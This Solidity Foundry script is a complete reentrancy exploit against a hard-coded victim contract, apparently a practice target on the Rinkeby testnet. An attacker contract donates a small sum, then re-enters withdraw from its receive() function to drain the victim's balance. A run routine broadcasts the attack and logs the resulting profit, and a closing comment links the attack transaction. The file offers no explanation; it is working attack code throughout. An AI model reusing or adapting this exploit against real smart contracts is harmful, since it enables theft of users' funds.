// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface Victim {
    function withdraw(uint256 _amount) external;

    function donate(address _to) external payable;
}

contract ReentranceAttacker {
    Victim constant v = Victim(0x07aF406EdFf82B64404402be3e69EF5dEA947a31);
    error Done();

    function attack() external payable {
        v.donate{value: 0.00011 ether}(address(this));
        v.withdraw(0.00011 ether);
    }

    receive() external payable {
        v.withdraw(0.00011 ether);
    }
}

contract Exec is Script {
    function run() external {
        ReentranceAttacker _a = new ReentranceAttacker();
        vm.startBroadcast();
        uint256 _oldBalance = address(_a).balance;
        uint256 _oldVictimBalance = address(
            0x07aF406EdFf82B64404402be3e69EF5dEA947a31
        ).balance;
        uint256 _bait = 0.00011 ether;
        console.log("oldBalance", _oldBalance);
        console.log("oldVictimBalance", _oldVictimBalance);

        _a.attack{value: _bait}();

        uint256 _newBalance = address(_a).balance;
        uint256 _newVictimBalance = address(
            0x07aF406EdFf82B64404402be3e69EF5dEA947a31
        ).balance;
        uint256 _profit = _newBalance - _oldBalance - _bait;
        console.log("newBalance", _newBalance);
        console.log("newVictimBalance", _newVictimBalance);
        console.log("profit", _profit);
        vm.stopBroadcast();
    }
}

// Attack TX: https://rinkeby.etherscan.io/tx/0x772e5593a23f61dd96c27960d5ca386a7a91d834f2c6b91182f4532cfa8330bd